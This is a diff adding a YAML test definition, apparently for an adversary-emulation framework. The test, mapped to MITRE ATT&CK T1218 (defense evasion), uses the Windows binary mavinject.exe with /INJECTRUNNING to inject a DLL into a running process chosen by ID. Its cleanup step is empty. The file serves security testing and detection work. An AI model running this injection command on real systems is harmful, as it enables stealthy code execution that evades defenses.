@@ -1,0 +1,28 @@
+api_version: "2.0"
+name: mavinject - Inject DLL into running process
+description: |
+    Injects arbitrary DLL into running process specified by process ID. Requires Windows 10.
+args:
+    - name: process_id
+      type: string
+      default: "1000"
+    - name: dll_payload
+      type: path
+      default: PathToAtomicsFolder\T1218\src\x64\T1218.dll
+uuid: c426dacf-575d-4937-8611-a148a86a5e61
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1218: System Binary Proxy Execution'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: mavinject---inject-dll-into-running-process
+      inline: |
+        mavinject.exe {{.Args.process_id}} /INJECTRUNNING "{{.Args.dll_payload}}"
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
